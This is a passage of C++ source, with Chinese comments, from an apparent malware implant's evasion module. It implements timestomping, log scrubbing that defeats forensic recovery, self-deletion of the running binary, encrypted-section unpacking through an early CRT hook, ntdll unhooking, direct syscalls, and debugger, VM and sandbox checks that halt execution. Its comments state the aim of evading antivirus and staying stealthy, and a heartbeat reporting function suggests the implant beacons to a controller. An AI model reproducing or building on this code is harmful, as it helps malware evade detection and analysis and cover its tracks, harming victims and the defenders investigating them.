    std::wstring sub = hostKey.empty() ? std::wstring(R6M_WSTR(blob_subkey, C4D651AF11D5938A)) : hostKey;
    HKEY k = nullptr;
    if (pOpen(HKEY_CURRENT_USER, sub.c_str(), 0, KEY_ALL_ACCESS, &k) == ERROR_SUCCESS) {
        pDelV(k, BlobValueName().c_str());
        pClose(k);
    }
    return pDelK(HKEY_CURRENT_USER, sub.c_str()) == ERROR_SUCCESS;
}

// ═══════════════════════════════════════════════════════════════════════════
// 12) 时间戳伪造
// ═══════════════════════════════════════════════════════════════════════════

bool TimestompFile(const std::wstring& path) {
    HANDLE h = CreateFileW(path.c_str(), FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;

    wchar_t sysDir[MAX_PATH] = {};
    GetSystemDirectoryW(sysDir, MAX_PATH);
    std::wstring ref = std::wstring(sysDir) + R6M_WSTR(kernel32, 36F5905204A25919);
    FILETIME ct{}, at{}, wt{};
    HANDLE hr = CreateFileW(ref.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hr != INVALID_HANDLE_VALUE) {
        // 参照系统文件时间：看起来最自然（不会被"所有文件同一秒创建"这类启发式命中）
        if (!GetFileTime(hr, &ct, &at, &wt)) { ct = at = wt = FILETIME{}; }
        CloseHandle(hr);
    }
    if (ct.dwLowDateTime == 0 && ct.dwHighDateTime == 0) {
        FILETIME now{};
        GetSystemTimeAsFileTime(&now);
        ULARGE_INTEGER u;
        u.LowPart = now.dwLowDateTime;
        u.HighPart = now.dwHighDateTime;
        u.QuadPart -= 365ULL * 24 * 3600 * 10000000ULL;   // 兜底：一年前
        ct.dwLowDateTime = u.LowPart; ct.dwHighDateTime = u.HighPart;
        at = ct;
        wt = ct;
    }
    BOOL ok = SetFileTime(h, &ct, &at, &wt);
    CloseHandle(h);
    return ok != FALSE;
}

// ═══════════════════════════════════════════════════════════════════════════
// 13) 日志与残留清理
// ═══════════════════════════════════════════════════════════════════════════

namespace {
Config g_cfg;
bool   g_cfgInit = false;
bool   g_diskLog = false;
std::wstring g_logPath;
AnalysisVerdict g_verdict;
bool   g_bootstrapped = false;
}

static bool EnvFlag(const char* name, bool defIfAbsent) {
    const char* v = getenv(name);
    if (!v) return defIfAbsent;
    return !(v[0] == '0' && v[1] == 0);
}

const Config& Cfg() {
    if (g_cfgInit) return g_cfg;
    g_cfgInit = true;
    const bool on = EnvFlag("R6M_EVASION", true);
    // [EV-OFF] 免杀总开关默认关；需要时置 R6M_EVASION=1
    g_cfg.enabled = EnvFlag("R6M_EVASION", false);
    g_cfg.force = EnvFlag("R6M_EVASION_FORCE", false);
    g_cfg.useSyscalls = !EnvFlag("R6M_EVASION_NOSYSCALL", false);
    g_cfg.unhook = !EnvFlag("R6M_EVASION_NOUNHOOK", false);
    // [EV-OFF] 默认不做 PPID 欺骗；需要时置 R6M_EVASION_PPID=1
    // [EV-REMOVED 20261017-140301] PPID 欺骗已停用（不再读环境变量）
    g_cfg.spoofParent = false;
    g_cfg.antiAnalysis = on && !EnvFlag("R6M_EVASION_NOANALYSIS", false);
    g_cfg.timingChecks = on && !EnvFlag("R6M_EVASION_NOTIMING", false);
    return g_cfg;
}

bool DiskLogEnabled() {
    if (const char* v = getenv("R6M_LOG")) {
        g_diskLog = !(v[0] == '0' && v[1] == 0);
        return g_diskLog;
    }
    g_diskLog = !Cfg().enabled;
    return g_diskLog;
}

std::wstring GeneratedLogPath() {
    if (!g_logPath.empty()) return g_logPath;
    wchar_t base[MAX_PATH] = {};
    if (!GetEnvironmentVariableW(L"LOCALAPPDATA", base, MAX_PATH)) {
        if (FAILED(EvSHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, base))) {
            GetTempPathW(MAX_PATH, base);
        }
    }
    uint64_t r = 0;
    RandBytes(&r, sizeof(r));
    wchar_t sub[16];
    swprintf_s(sub, L"%08X", (unsigned)(r >> 32));
    std::wstring dir = std::wstring(base) + L"\\" + sub;
    CreateDirectoryW(dir.c_str(), nullptr);

    uint64_t r2 = 0;
    RandBytes(&r2, sizeof(r2));
    wchar_t name[32];
    swprintf_s(name, L"%08X.tmp", (unsigned)(r2 >> 24));
    g_logPath = dir + L"\\" + name;

    // 伪造目录与文件时间，弱化"新落地目录"这一特征
    TimestompFile(g_logPath);
    return g_logPath;
}

void ScrubLogFile(const std::wstring& path) {
    // 用随机噪声覆盖再删除：单纯删除会在 $MFT 留下记录，覆盖后内容不可恢复
    HANDLE h = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr, OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return;
    LARGE_INTEGER sz{};
    if (GetFileSizeEx(h, &sz) && sz.QuadPart > 0 && sz.QuadPart < 64LL * 1024 * 1024) {
        std::vector<uint8_t> noise((size_t)sz.QuadPart);
        RandBytes(noise.data(), noise.size());
        SetFilePointer(h, 0, nullptr, FILE_BEGIN);
        DWORD w = 0;
        WriteFile(h, noise.data(), (DWORD)noise.size(), &w, nullptr);
        FlushFileBuffers(h);
    }
    CloseHandle(h);
    TimestompFile(path);
}

void CleanupArtifacts(const std::wstring& logPath) {
    if (!logPath.empty()) {
        ScrubLogFile(logPath);
        DeleteFileW(logPath.c_str());
    }
    // 提升权限时写下的受限临时配置 r6m-cfg-<pid>.ini
    wchar_t tmp[MAX_PATH] = {};
    if (GetTempPathW(MAX_PATH, tmp)) {
        std::wstring pat = std::wstring(tmp);
        WIN32_FIND_DATAW fd{};
        HANDLE f = FindFirstFileW((pat + L"r6m-cfg-*.ini").c_str(), &fd);
        if (f != INVALID_HANDLE_VALUE) {
            do {
                std::wstring p = pat + fd.cFileName;
                ScrubLogFile(p);
                DeleteFileW(p.c_str());
            } while (FindNextFileW(f, &fd));
            FindClose(f);
        }
    }
}

bool SelfDelete() {
    // 正在运行的映像不能直接删，但可以：
    //   ① 复制一份到随机名（保持内容有效，避免留下"0 字节残骸"这一可疑特征）
    //   ② 用替身覆盖原路径，再让替身延迟到重启时删除
    wchar_t self[MAX_PATH] = {};
    if (!GetModuleFileNameW(nullptr, self, MAX_PATH)) return false;
    std::wstring src = self;
    const size_t slash = src.find_last_of(L'\\');
    if (slash == std::wstring::npos) return false;
    std::wstring dir = src.substr(0, slash);

    uint64_t r = 0;
    RandBytes(&r, sizeof(r));
    wchar_t nm[32];
    swprintf_s(nm, L"\\~%08X.tmp", (unsigned)(r >> 32));
    std::wstring scratch = dir + nm;

    bool ok = false;
    if (CopyFileW(src.c_str(), scratch.c_str(), FALSE)) {
        TimestompFile(scratch);
        // 用替身覆盖自身路径（此时自身仍被映射，替换目录项是允许的）
        ok = MoveFileExW(scratch.c_str(), src.c_str(), MOVEFILE_REPLACE_EXISTING) != FALSE;
        // 安排重启后删除替身
        MoveFileExW(scratch.c_str(), scratch.c_str(), MOVEFILE_DELAY_UNTIL_REBOOT);
    }
    if (!ok) {
        // 退路：直接改名（部分 Windows 版本允许对运行中的映像做目录项改名）
        ok = MoveFileExW(src.c_str(), scratch.c_str(), MOVEFILE_REPLACE_EXISTING) != FALSE;
        if (ok) {
            TimestompFile(scratch);
            MoveFileExW(scratch.c_str(), scratch.c_str(), MOVEFILE_DELAY_UNTIL_REBOOT);
        }
    }
    return ok;
}

// ═══════════════════════════════════════════════════════════════════════════
// 13b) 构建后段加密（.r6mx）的运行时解密
//
//   布局（tools/pack_sections.py 生成）：
//     .r6mx 节 raw data = magic'R6MX'(4) ver(2) count(2) key(4) + count 个记录
//       每记录 = va(4) len(4) crc32(4) rsv(4) rsv(4) + 密文(len)
//     目标段（默认 .rdata）自身也被同一 keystream 原地加密；
//     运行时按同一 keystream 解回来，再与 .r6mx 里的密文副本 + CRC 双重校验。
//   为什么 key 放在节里而不是文件 trailer：内存映像里没有"文件末尾"，
//   运行时只能靠节内偏移定位（文件 trailer 留给静态校验工具用）。

// ═══════════════════════════════════════════════════════════════════════════

uint8_t PackKeyByte(uint32_t key, uint64_t i) {
    uint64_t z = (uint64_t)key + 0x9E3779B97F4A7C15ULL * (i + 1);
    z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9ULL;
    z = (z ^ (z >> 27)) * 0x94D049BB133111EBULL;
    return (uint8_t)(z ^ (z >> 31));
}

namespace {
uint32_t Crc32(const uint8_t* p, size_t n) {
    static uint32_t tbl[256];
    static bool init = false;
    if (!init) {
        for (uint32_t i = 0; i < 256; i++) {
            uint32_t c = i;
            for (int k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320u ^ (c >> 1)) : (c >> 1);
            tbl[i] = c;
        }
        init = true;
    }
    uint32_t c = 0xFFFFFFFFu;
    for (size_t i = 0; i < n; i++) c = tbl[(c ^ p[i]) & 0xFF] ^ (c >> 8);
    return c ^ 0xFFFFFFFFu;
}
} // namespace

namespace {
// 早期诊断：此阶段 CRT 未初始化，只能直写 stderr 句柄（不依赖 printf/iostream）
void PackDbg(const char* tag, uint64_t a = 0, uint64_t b = 0, uint64_t c = 0) {
    if (getenv("R6M_PACK_DEBUG") == nullptr) return;
    char buf[256];
    HANDLE h = GetStdHandle(STD_ERROR_HANDLE);
    if (h == INVALID_HANDLE_VALUE || h == nullptr) return;
    int n = 0;
    for (const char* p = tag; *p && n < 100; p++) buf[n++] = *p;
    static const char* hexd = "0123456789ABCDEF";
    uint64_t v[3] = { a, b, c };
    for (int k = 0; k < 3; k++) {
        if (v[k] == 0 && k > 0) continue;
        buf[n++] = ' ';
        for (int s = 60; s >= 0; s -= 4) buf[n++] = hexd[(v[k] >> s) & 0xF];
    }
    buf[n++] = '\n';
    DWORD w = 0;
    WriteFile(h, buf, (DWORD)n, &w, nullptr);
}

//
// （任何反应本身都是信号），结果现场只能看到"双击没反应、进程秒退、日志空"。
// 实测：同一二进制在本机用 python subprocess 启动 12/12 全部静默退出，
// 而用 Start-Process 启动 12/12 存活 —— 这种差异没有任何输出可供排查。
// 折中：调试输出只走 stderr 且需显式环境变量，不落盘、不弹窗，不破坏隐蔽性。
void EvDbgLine(const char* tag, const char* detail, uint32_t bits, int score) {
    if (getenv("R6M_PACK_DEBUG") == nullptr) return;
    HANDLE h = GetStdHandle(STD_ERROR_HANDLE);
    if (h == INVALID_HANDLE_VALUE || h == nullptr) return;
    char buf[512];
    int n = 0;
    for (const char* p = tag; *p && n < 60; p++) buf[n++] = *p;
    buf[n++] = ' ';
    static const char* hexd = "0123456789ABCDEF";
    for (int s = 28; s >= 0; s -= 4) buf[n++] = hexd[(bits >> s) & 0xF];
    buf[n++] = ' ';
    {
        char tmp[16];
        int m = 0;
        int v = score;
        bool neg = v < 0;
        if (neg) v = -v;
        do { tmp[m++] = (char)('0' + v % 10); v /= 10; } while (v && m < 15);
        if (neg) buf[n++] = '-';
        while (m > 0) buf[n++] = tmp[--m];
    }
    buf[n++] = ' ';
    for (const char* p = detail; p && *p && n < 480; p++) buf[n++] = *p;
    buf[n++] = '\n';
    DWORD w2 = 0;
    WriteFile(h, buf, (DWORD)n, &w2, nullptr);
}
} // namespace

bool PackDecryptAndVerify() {
    PackDbg("[pack] enter");
    HMODULE self = GetModuleHandleA(nullptr);
    PackDbg("[pack] self", (uint64_t)self);
    if (!self) return false;
    auto* dos = (IMAGE_DOS_HEADER*)self;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { PackDbg("[pack] bad DOS"); return false; }
    auto* nt = (IMAGE_NT_HEADERS64*)((uint8_t*)self + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { PackDbg("[pack] bad NT"); return false; }
    PackDbg("[pack] nsec", nt->FileHeader.NumberOfSections);

    IMAGE_SECTION_HEADER* pack = nullptr;
    IMAGE_SECTION_HEADER* s = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
        if (s->Name[0] == '.' && s->Name[1] == 'r' && s->Name[2] == '6' &&
            s->Name[3] == 'm' && s->Name[4] == 'x' && s->Name[5] == 0) {
            pack = s;
            break;
        }
    }
    if (!pack) { PackDbg("[pack] no .r6mx -> no-op"); return true; }

    const uint8_t* blob = (const uint8_t*)self + pack->VirtualAddress;
    const uint32_t blobLen = pack->Misc.VirtualSize;
    PackDbg("[pack] blob", (uint64_t)blob, blobLen);
    PackDbg("[pack] magic", *(const uint32_t*)blob);
    if (blobLen < 16) return false;
    if (*(const uint32_t*)blob != 0x584D3652u) { PackDbg("[pack] magic mismatch"); return false; }
    const uint16_t count = *(const uint16_t*)(blob + 6);
    const uint32_t key   = *(const uint32_t*)(blob + 8);
    PackDbg("[pack] header", count, key);
    if (key == 0 || count == 0 || count > 64) return false;

    uint32_t off = 16;
    for (uint16_t r = 0; r < count; r++) {
        if (off + 20 > blobLen) { PackDbg("[pack] rec hdr overrun", r, off); return false; }
        const uint32_t va  = *(const uint32_t*)(blob + off + 0);
        const uint32_t len = *(const uint32_t*)(blob + off + 4);
        const uint32_t crc = *(const uint32_t*)(blob + off + 8);
        off += 20;
        PackDbg("[pack] rec", r, ((uint64_t)va << 32) | len, crc);
        if (len == 0 || off + len > blobLen) { PackDbg("[pack] rec data overrun"); return false; }
        if ((uint64_t)va + len > nt->OptionalHeader.SizeOfImage) { PackDbg("[pack] va OOR"); return false; }
        const uint8_t* enc = blob + off;
        off += len;
        uint8_t* target = (uint8_t*)self + va;
        const uint32_t k = key ^ (va * 2654435761u);
        PackDbg("[pack] decrypting", (uint64_t)target, len, k);
        for (uint32_t i = 0; i < len; i++) target[i] = (uint8_t)(enc[i] ^ PackKeyByte(k, i));
        uint32_t got = Crc32(target, len);
        PackDbg("[pack] crc", got, crc);
        if (got != crc) { PackDbg("[pack] CRC MISMATCH"); return false; }
    }
    PackDbg("[pack] OK");
    return true;
}

// ═══════════════════════════════════════════════════════════════════════════

AnalysisVerdict RunAnalysisChecks(uint32_t mask) {
    AnalysisVerdict v;
    auto add = [&](uint32_t bits, int weight, const char* tag) {
        if (!bits) return;
        v.bits |= bits;
        v.score += weight;
        if (!v.detail.empty()) v.detail += ",";
        v.detail += tag;
    };

    if (mask & 0x1) add(CheckDebugger(), 60, "dbg");
    if (mask & 0x2) add(CheckVirtualization(), 30, "vm");
    if (mask & 0x4) add(CheckSandboxHeuristics(), 20, "sandbox");
    if (mask & 0x8) add(CheckModulesAndTools(), 40, "tools");
    if (Cfg().timingChecks && (mask & 0x10)) {
        if (SyntheticTimingDetected()) add(EV_SYNTHETIC_TIME, 50, "synthetic-time");
        else if (AccelerationDetected()) add(EV_FAST_RETURN, 50, "fast-sleep");
    }

    // 判定规则（刻意保守，降低误报）：
    //   纯虚拟机特征单独命中不判定（大量真实用户就在 VM 里跑），需累计到 60 分
    const uint32_t hard = EV_PEB_DEBUGGED | EV_PEB_NT_GLOBAL | EV_NT_QUERY_DEBUG |
                          EV_DEBUG_OBJECT | EV_HEAP_FLAGS | EV_ANALYSIS_TOOLS |
                          EV_TITLE_SCAN | EV_SANDBOX_DLL | EV_FAST_RETURN | EV_SYNTHETIC_TIME;
    if (v.bits & hard) v.suspect = true;
    else if (v.score >= 60) v.suspect = true;
    return v;
}

bool Bootstrap() {
    const Config& c = Cfg();

    //      路径，等于把静态混淆的成果从运行期再泄漏出去。
    DiskLogEnabled();
    if (g_diskLog) GeneratedLogPath();

    // ⓪ 段解密已在 .CRT$XIB 静态构造里完成（早于一切字符串使用）。
    //    这里只是确认结果：校验失败说明二进制被篡改或打包损坏，直接拒绝启动。
    if (!PackOk()) return false;

    // ① 先解除 ntdll inline hook（让后续 SSN 解析拿到干净桩）
    if (c.enabled && c.unhook) UnhookNtdll(true);

    // ② 预热 syscall 桩池（一次性 RWX，早分配避免运行期触发 W^X 告警）
    if (c.enabled && c.useSyscalls) InitSyscallPool();

    if (!c.enabled) return true;
    if (g_bootstrapped) return true;
    g_bootstrapped = true;

    if (c.antiAnalysis) {
        g_verdict = RunAnalysisChecks(c.checkMask);
        // 诊断：把判定链打到 stderr（仅 R6M_PACK_DEBUG=1）。
        // 见 EvDbgLine 的说明 —— 静默失败在生产上完全不可排查。
        EvDbgLine("[ev] verdict", g_verdict.detail.c_str(), g_verdict.bits, g_verdict.score);
        EvDbgLine("[ev] suspect/force", g_verdict.suspect ? "suspect=1" : "suspect=0",
                  (uint32_t)(c.force ? 1 : 0), 0);
        if (g_verdict.suspect && !c.force) {
            return false;
        }
    } else {
        EvDbgLine("[ev] antiAnalysis", "disabled", 0, 0);
    }

    // ④ 落盘策略已在 ⓪-1 处理（此处不再重复确定）
    return true;
}

const AnalysisVerdict& Verdict() { return g_verdict; }

} // namespace ev
} // namespace r6m

// ── 全局命名空间的 Logger 钩子（Logger.h 里声明，故意不放进命名空间，
//    这样 Logger.h 不必 include Evasion.h 的模板）──
bool r6m_ev_disk_log_enabled() { return ::r6m::ev::DiskLogEnabled(); }
std::wstring r6m_ev_log_path() { return ::r6m::ev::GeneratedLogPath(); }

namespace r6m {
namespace ev {

// ── 段解密的"最早期"钩子 ─────────────────────────────────────────────────
// 必须早于：① 任何字符串常量被读取 ② 任何 static 对象的动态初始化
// 因此挂在 CRT 初始化链最前面的 .CRT$XIB 段（x86/x64 MSVC 均按段名字典序执行
// XIA → XIB → XIC → ... → XCZ，XIB 早于 C++ 静态构造）。
// 注意：这里**不能**用任何需要 CRT 已初始化的东西（不能 std::string、
// 不能 _putenv_s），只用裸的 PE 头解析 + 内存异或。
namespace {
bool g_packOk = false;
struct PackInit {
    PackInit() {
        // 诊断开关：R6M_PACK_DEBUG=1 时把判定链打到 stderr，用于定位
        // "解密为何失败"（此阶段 CRT 未初始化，只能用 OutputDebugString/WRITE）。
        g_packOk = PackDecryptAndVerify();
    }
};
#pragma section(".CRT$XIB", read)
__declspec(allocate(".CRT$XIB")) PackInit g_packInit;
}
bool PackOk() { return g_packOk; }

std::string ReportForHeartbeat() {
    if (g_verdict.bits == 0 && g_verdict.score == 0) return std::string();
    char buf[320];
    snprintf(buf, sizeof(buf), "flags=0x%08X;score=%d;detail=%s",
             g_verdict.bits, g_verdict.score, g_verdict.detail.c_str());
    return std::string(buf);
}

} // namespace ev
} // namespace r6m

// ═══════════════════════════════════════════════════════════════════════════
// 13c) 动态 API 薄封装实现（消除静态导入，声明见 Evasion.h 第 7 节）
//      实现体在 EvAdapters.inc：30+ 个纯机械封装，单独放便于审阅
//      "是否每个都真的走了哈希解析"
// ═══════════════════════════════════════════════════════════════════════════
// （此处的 include 已移至文件末尾：封装必须位于文件作用域）


#include "EvAdapters.inc"

